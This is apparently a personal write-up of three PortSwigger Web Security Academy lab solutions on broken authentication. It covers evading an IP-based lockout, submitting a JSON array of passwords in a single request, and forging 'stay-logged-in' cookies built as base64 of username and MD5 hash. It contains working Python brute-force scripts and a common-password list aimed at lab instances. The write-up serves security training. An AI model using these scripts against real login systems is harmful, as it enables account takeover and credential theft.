# Authentication Vulnerabilities

<h3> Broken brute-force protection, IP block</h3>

![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/503c5d03-8fab-4ecd-93be-77c2e1a16e64)

Going over to the web app shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/db03e8c5-4227-485b-9051-4a96584bede6)

But since we're interested in the login page I went there
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/411fdbb1-67db-49d8-8beb-a640a8884278)

First thing we should note is that we're already given a cred to login as `wiener:peter` but the goal is to brute force the user `carlos` password with the password wordlist given

Let us login as the user *wiener* first
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/8d66fd76-235f-4da4-9395-6001a09673e3)

It works cool. When we try loggin in as user carlos with a random cred it shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/e6ee17ee-7936-41e2-94bb-f198501862c9)

And after the third attempt of trying random password it shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/d5dbd879-c1aa-4d34-80db-1390c6e3ab69)

Hmmmm we've been blocked for one minute

After waiting for a minute and then trying to login as user *wiener* works
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/e6238793-bfe4-437a-8f87-e597bc785b2f)

I logged out then tried loggin in as user carlos with random password but for just two request
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/a0b860a9-8975-4a48-8c79-807a8a91642c)

Then the third request I logged in as user wiener and it works
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/249e4a48-e522-4124-803f-852803064425)

So now the logic behind this login function is that:
- After two failed login we get incorrect password as expected
- Then the third login when tried with a valid cred works which prevents the the web app from blocking our IP

Cool with this we know that we can brute force the user's password for every two requests made and the third request we will login as weiner

I made a script for that though *Portswigger* recommended a burp extension
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/2392dd57-3372-4b21-8781-612ee1ef8f79)

Here's my script 

```python
#!/usr/bin/python3
import requests
import time
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

with open('passwords.txt', 'r') as f:
    passwords = [passwd.strip() for passwd in f.readlines()]

url = 'https://0a42008903a8b19183b582120062005e.web-security-academy.net/login'

data = {
    'username': 'carlos',
    'password': ''
}

valid_cred = {
    'username': 'wiener',
    'password': 'peter'
}

# Make a valid request to prevent IP Block
req = requests.post(url, data=valid_cred, verify=False, allow_redirects=True)

count = 0

for password in passwords:
    data['password'] = password
    req = requests.post(url, data=data, verify=False)

    if 'Incorrect password' not in req.text:
        print(f'Password found: {password}')
        break

    count += 1

    # On every 3rd request bypass IP blocker by logging in with valid cred
    if count == 2:
        print(f'Trying: {password}')
        req = requests.post(url, data=valid_cred, verify=False)

        count = 0
```

Running it gives the password
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/a37c4341-dd38-491a-a0a1-bf0c83de5afd)

And automatically it shows solved
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/38123a6b-bac9-492a-b674-a3f050160a32)


<h3> Broken brute-force protection, multiple credentials per request </h3>

![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/df0abf24-e21d-4afa-a935-9786792d7b51)

Moving over to the web app shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/4a5577ac-d4aa-481e-a721-b9c9fb61163e)

Since the task is to login as user carlos let us go to the login page
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/66e9bcee-fae7-4bb5-8460-16481de430c1)

After trying the username *carlos* with a random password and intercepting it in burp suite I get this request
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/deebfa7f-f55d-4dd3-a7bd-46a16ccb6356)

Notice the way the data is passed to the web server in form of json

```
{"username":"carlos","password":"deyplay"}
```

If we try to brute force the password we get rate limited but here's something way more cooler

We know that this is json right?

Therefore we can pass the password values as an array 

So basically the web server will loop through the password variable till it gets the right password

I used python to make it a better json format

Here's my script 

```python
import json

password_list = [
    "123456", "password", "12345678", "qwerty", "123456789", "12345", "1234", "111111",
    "1234567", "dragon", "123123", "baseball", "abc123", "football", "monkey", "letmein",
    "shadow", "master", "666666", "qwertyuiop", "123321", "mustang", "1234567890", "michael",
    "654321", "superman", "1qaz2wsx", "7777777", "121212", "000000", "qazwsx", "123qwe",
    "killer", "trustno1", "jordan", "jennifer", "zxcvbnm", "asdfgh", "hunter", "buster",
    "soccer", "harley", "batman", "andrew", "tigger", "sunshine", "iloveyou", "2000",
    "charlie", "robert", "thomas", "hockey", "ranger", "daniel", "starwars", "klaster",
    "112233", "george", "computer", "michelle", "jessica", "pepper", "1111", "zxcvbn",
    "555555", "11111111", "131313", "freedom", "777777", "pass", "maggie", "159753",
    "aaaaaa", "ginger", "princess", "joshua", "cheese", "amanda", "summer", "love",
    "ashley", "nicole", "chelsea", "biteme", "matthew", "access", "yankees", "987654321",
    "dallas", "austin", "thunder", "taylor", "matrix", "mobilemail", "mom", "monitor",
    "monitoring", "montana", "moon", "moscow"
]

json_array = json.dumps(password_list)

print(json_array)
```

Running it gives us a better json format
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/63299bd1-61aa-486a-b3c2-2ae3c45ada99)

Now I replaced it as the password value in the request 
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/3443cc8f-3ab2-47db-870c-7ad22f3c79a3)

After forwarding the request I got logged in
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/2c1a25b8-2c6c-4624-8de5-2cc007bf63b9)


<h3> Brute-forcing a stay-logged-in cookie </h3>
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/9e73798c-5592-4825-9877-9c310fb72049)

Going over to the web app login page shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/57ea7e14-ecf1-4395-81bb-ce6635679bc5)

When i tried login in as user wiener with the password as peter and i intercepted the request in burp suite i saw this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/b1674a4c-8097-4239-a63e-9ea832d824fd)

Then I got logged in 
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/1eb89a5a-adfd-4aa6-a6ae-297185e258bd)

Nothing too interesting there

But now there's a remember me button on the login page 

So i went ahead to login again but this time around click the button
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/33cdb04d-1233-4c55-85a6-e5aef08e538f)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/39057f15-b8fb-477d-b945-326f2d228e9c)

It created a stay logged in cookie for us
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/1ed563b4-599d-4760-94c1-68e3286c8a13)

Seems like it's encoded

Using cyberchef I decoded it and it turns out to be a base64 string
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/49ac80ca-78c3-4a30-8a48-8084848b1499)

```
wiener:51dc30ddc473d43a6011e9ebba6ca770
```

Hmmmm 🤔

This looks like a hash

Using crackstation to decode it works
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/7993e2e3-a9da-42d8-8c34-45de0f758b95)

Now we know the way the web server creates the stay logged in cookie

By taking the base64 encoded form of the hash of a password along side with the username:

```
base64(username:md5hash(password))
```

Since the aim is to get logged in as user carlos and we are already given a password list

I wrote a script to automate that for me

```python
import requests
from base64 import b64encode, b64decode
from hashlib import md5
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

with open('passwords.txt', 'r') as f:
    passwords = [i.strip() for i in f.readlines()]

url = 'https://0aa9007b04ad189280c7801c00ea00ed.web-security-academy.net/my-account'
proxy = {'https': 'http://127.0.0.1:8080'}

for password in passwords:
    bytes_ = password.encode()
    hash_ = md5(bytes_).hexdigest()
    signed_in = 'carlos:' + hash_
    encoded = b64encode(signed_in.encode()).decode()
    cookies = {
        'stay-logged-in': encoded
    }

    req = requests.get(url, cookies=cookies, proxies=proxy, verify=False)
    if len(req.text) != 4884:
        print('Password found: ' + password)
        break
```

Running it gives us the password
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/8092d91e-309f-49df-b33a-ce2a38bfab8e)

We can then use that to login
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/8fdcddfc-68cb-4bfb-ab23-99fe504f87a2)

<button onclick="window.location.href='https://sec-fortress.github.io';">Back To Home螥</button>

